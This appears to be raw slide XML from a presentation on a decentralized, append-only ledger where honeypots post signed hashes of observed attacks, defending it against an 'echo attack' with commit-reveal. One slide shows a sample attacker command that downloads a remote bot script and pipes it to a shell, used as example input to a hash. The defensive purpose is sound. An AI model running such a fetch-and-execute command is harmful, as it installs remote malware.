            <a:ext cx="3063240" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A new attack, and its fix</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>We define the echo attack (copying others' reports) and block it with commit–reveal.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="unique 4 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="3063240"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="unique 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486400" y="3063240"/>
            <a:ext cx="3063240" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Every claim measured</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Live chain, up to 16 nodes, 8 experiments, a real hub baseline, cost formulas matched to the unit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OUR DESIGN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Our idea: a shared notice board</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="notice board"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="4114800" cy="3154680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="notice board header"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1463040"/>
            <a:ext cx="3657600" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SHARED LEDGER  ·  APPEND-ONLY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="notice board post 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1828800"/>
            <a:ext cx="3657600" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent5"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="notice board post 1 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="1828800"/>
            <a:ext cx="3383280" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P1  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6f87…fd58</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="notice board post 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2340864"/>
            <a:ext cx="3657600" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="notice board post 2 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="2340864"/>
            <a:ext cx="3383280" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P2  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>5403…d1ca</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="notice board post 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2852928"/>
            <a:ext cx="3657600" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent5"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="notice board post 3 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="2852928"/>
            <a:ext cx="3383280" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P3  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6f87…fd58</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="notice board post 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3364992"/>
            <a:ext cx="3657600" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="notice board post 4 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="3364992"/>
            <a:ext cx="3383280" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P2  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>36af…caf1</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="notice board post 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3877056"/>
            <a:ext cx="3657600" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent5"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="notice board post 5 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="3877056"/>
            <a:ext cx="3383280" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>P4  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6f87…fd58</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="idea 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="1417320"/>
            <a:ext cx="3566160" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pin a fingerprint</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Each honeypot posts a hash of what it saw, signed with its own name.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="idea rule 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="2377440"/>
            <a:ext cx="3566160" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="idea 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="2468880"/>
            <a:ext cx="3566160" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Nobody owns the board</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Nothing can be erased, and no one has to be trusted to keep it.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="idea rule 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="3429000"/>
            <a:ext cx="3566160" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="idea 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="3520440"/>
            <a:ext cx="3566160" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Same print, several names</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Highlighted: P1, P3 and P4 saw the same attack, so it is corroborated.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OUR DESIGN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Key tool: the hash, a data fingerprint</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="hash input 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="3657600" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="hash input 1 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658368" y="1371600"/>
            <a:ext cx="3520440" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>wget http://198.51.100.7/bot.sh | sh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="hash arrow in 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4279392" y="1655064"/>
            <a:ext cx="338328" cy="914"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="sha box 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="1444752"/>
            <a:ext cx="914400" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 17391"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent5"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
